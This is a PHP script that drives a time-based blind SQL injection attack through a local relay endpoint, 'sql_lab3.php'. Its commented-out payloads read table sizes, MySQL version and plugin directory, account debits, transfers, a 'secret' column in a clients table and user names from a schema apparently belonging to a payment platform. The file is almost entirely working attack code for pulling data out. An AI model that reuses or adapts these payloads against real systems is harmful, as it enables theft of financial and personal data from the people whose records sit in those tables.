<?php

$data = [
    "target" => "1",
    "method" => "2",
    "func" => "CF",
    "finder" => "1",
    "table" => "",
    "column" => "",
    "sleep" => "5",
    "charposp"=>"1",
    "length" => "15",
    //"param"=>"(SELECT INFO FROM information_schema.processlist WHERE INFO LIKE '%25processlist%25')"
    //"param"=>"(SELECT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA = 'pesaflow')AND(TABLE_NAME = 'bills')AND(COLUMN_KEY = 'PRI'))",
    //"param" => "(SELECT @@plugin_dir)",
    //"param"=>"(SELECT(debit)FROM(masterAccounts)LIMIT 1)",
    //"param"=>"(SELECT(COUNT(*))FROM(card_velocity_logs))",
    //"param"=>"(SELECT(@@version))",
    //(SELECT(secret)FROM(clients)LIMIT 1 OFFSET 2)
    // "param" => "(SELECT(inserted_at)FROM(transfers)ORDER%20BY%20amount%20DESC%20LIMIT%201)",
    //"param"=>"(SELECT%20concat(TABLE_SCHEMA,'_',TABLE_NAME)TABLE_NAME%20FROM(information_schema.TABLES)ORDER%20BY(DATA_LENGTH)DESC%20LIMIT%201)",
    // "param" => "(SELECT%20ROUND(DATA_LENGTH/1048576,3)DATA_LENGTH%20FROM(information_schema.TABLES)ORDER%20BY(DATA_LENGTH)DESC%20LIMIT%201)",
    "param" => "(SELECT(userFullNames)FROM(users)LIMIT 1 OFFSET 1)"
];
$qq2 = base64_encode(json_encode($data));
$url = 'http://localhost/kever/sql_lab3.php?ch=' . $qq2;

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);

if ($response === false) {
    // Handle cURL error
    $error = curl_error($ch);
    //echo logStatement($path . "pftb/err/table_".$table.".txt", "cURL Error: " . $error." ");
    echo $error;
} else {
    // Process the response
    //echo logStatement($path . "pftb/res/table_".$table.".txt", $response." ");
    echo $response;
}

curl_close($ch);
//*/
/*
27759855

*/